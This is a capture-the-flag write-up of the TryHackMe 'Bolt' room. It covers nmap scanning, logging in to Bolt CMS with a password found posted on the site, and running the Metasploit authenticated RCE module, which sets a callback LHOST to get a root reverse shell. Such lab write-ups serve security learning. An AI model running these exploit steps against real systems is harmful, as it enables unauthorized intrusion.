This is a writeup for the Bolt challenge on Try-Hack-Me. This room is designed for users to get familiar with the Bolt CMS and how it can be exploited using Authenticated Remote Code Execution. Rated as Easy/Beginner level machine.
<!--exc-->


# Introduction
In this post, we'll try to root [Bolt](https://tryhackme.com/room/bolt). It was created by [Umair](https://twitter.com/0x9747/) and is rated as **Easy/Beginner** level machine.
**Goal**: exploit Bolt CMS using Authenticated Remote Code Execution


# Prerequisites
## Kali Linux / Parrot Security OS 
The virtual machine we'll use to source the attack vectors against the Bolt machine. These Linux distribution has all required tools pre-installed. Choose one of them.
* **Kali Linux** VM (based on Debian distribution) can be downloaded for both VMware and VirtualBox from [Offensive-Security](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
* **Parrot Security** VM (based on Arch distribution with different desktop flavors) can be downloaded from [Parrot Security](https://www.parrotsec.org/download/)

## TryHackMe account
Signup or login to [TryHackMe](https://tryhackme.com/), deploy the [machine](https://tryhackme.com/room/bolt) and give it a couple of minutes to boot.

## Dedicated Directory
We need to create a dedicated directory in our home directory `~` for our findings. We'll use `mkdir` to create the directory and `cd` to change into it:

```console
$ mkdir ~/tryhackme/bolt
$ cd ~/tryhackme/bolt/
```

## Add IP to hosts file [OPTIONAL]
For better readability we'll add the target IP to our local `/etc/hosts` file.
Please note this command requires sudo privileges. 

```console
$ sudo nano /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali
10.10.255.222   bolt
...
```

Now we can use the '**bolt**' hostname instead of the IP in all the commands.

## Verify our IP address
We need to verify our IP address. We'll use the `ip addr` command to list all interfaces on our machine:

```console
$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:ab:08:1c brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 86387sec preferred_lft 86387sec
    inet6 fe80::a00:27ff:feab:81c/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none 
    inet 10.9.137.76/16 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::1f60:137d:6ff7:6646/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
```

In this example, our IP is **10.9.137.76** - as can be seen under `tun0` section, which is the VPN tunnel created by OpenVPN.


# Scanning
## nmap

Note:
: Make sure to deploy the machine and wait for ~5 minutes to allow all services to boot.

We'll start with scanning the host for open ports using [nmap](https://nmap.org/). The command we'll use is `sudo nmap -sV -T4 -p- -O -oN nmap bolt` which is a full TCP-SYN scan to scan for open TCP ports on the target. Let's break it down:
* `-sV` determine service/version info
* `-T4` for faster execution
* `-p-` scan all ports
* `-O` identify Operating System
* `-oN` output to file, in our case it's called nmap

```console
$ sudo nmap -sV -T4 -p- -O -oN nmap bolt
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-31 10:38 EST
Nmap scan report for 10.10.255.222
Host is up (0.080s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
[REDACTED]/tcp open  http    (PHP 7.2.32-1)
...
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
...
```

According **nmap**, there is a website enabled on two different ports - port 80 and another one. We can use Firefox to check both ports:
* The website on port 80 is a default Apache page. nothing to we can use.
* The website on the second port on the other hand seems interesting as it contains some information. At the bottom of the web page we can find this is **Bolt CMS** (Content Management System):

![Bolt-built_with](/assets/img/posts/Bolt/Bolt-built_with.png) _Built with Bolt_

There are two entries in the homepage. One is a "**Message for IT department**" where we can find a **clear text password and potential username**:

![msg1](/assets/img/posts/Bolt/Bolt-msg1.png) _Message 1_

The second one clearly stating the **username**:

![msg2](/assets/img/posts/Bolt/Bolt-msg2.png) _Message 2_


# Gaining Access
Now that we have a possible username and password, we need to find the login page for Bolt CMS. A quick Google search to try and find the path for Bolt CMS login page:

![cms_login](/assets/img/posts/Bolt/Bolt-cms_login.png) _Bolt CMS login path_

Using the new information we have, we'll change path to the login page http://bolt:REDACTED/bolt/ and try to login using the credentials we have.
**Success**, the combination of username and password worked. We now have access to the website admin interface.


# Privilege Escalation
The version of the CMS can be found at the page footer:

![Bolt footer](/assets/img/posts/Bolt/Bolt-footer.png) _Bolt footer_

Now that we have the version, we can look for known vulnerability in metasploit.[exploit-db](https://www.exploit-db.com/).

![Bolt vulnerability](/assets/img/posts/Bolt/Bolt-edb_id.png) _Bolt EDB_

We'll use metasploit to find and run the exploit.

Note:
: Before using metasploit, you might need to update it using `apt update; apt install metasploit-framework` command.

Now lunch `msfconsole` and search for the EDB-ID [REDACTED]:

```console
msf6 > search [REDACTED]

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/webapp/[REDACTED]  2020-05-07       excellent  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/bolt_authenticated_rce
```

In order to use that module we need to run the `use 0` command, where the number is the number of the module in the list above.

Now we can use `options` command to see what parameters are required before we lunch the attack, `set` them and lunch the attach using `exploit` command:

```console
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS bolt
RHOSTS => bolt
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST 10.9.137.76
LHOST => 10.9.137.76
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
PASSWORD => boltadmin123
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
USERNAME => bolt
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set LPORT 3344
LPORT => 3344
msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit 
```

Looks like we have an active shell. Use [whoami](https://en.wikipedia.org/wiki/Whoami) or `id` commands to check which user we are using - we are `root`!
You might want to run the `shell` command and switch to **bash shell** if you're more comfortable with it.
Now we need to search for the flag using. the **find** command is a quick and easy way to find any file or directory. In our case we'll use the `find / -type f -name 'flag.txt' 2>/dev/null` command, which breaks down to:
* `/` is the root path to start the scan from
* `-type f` search for file (`d` for directory)
* `-name 'flag.txt'` file name *flag.txt*. we can use wildcard as well, e.g. '\*flag\*'
* `2>/dev/null` this will produce a cleaner output as it will discard errors, such as permission errors.

The file is found in the `/home/` path. print it to screen using `cat`:

```console
$ cat /home/flag.txt
[REDACTED]
```


# Summary
* Google-Fu - Google is a great source of knowledge if you're not familiar with a service.
* `find` command is very powerful. It can save a lot of time and you should learn it.
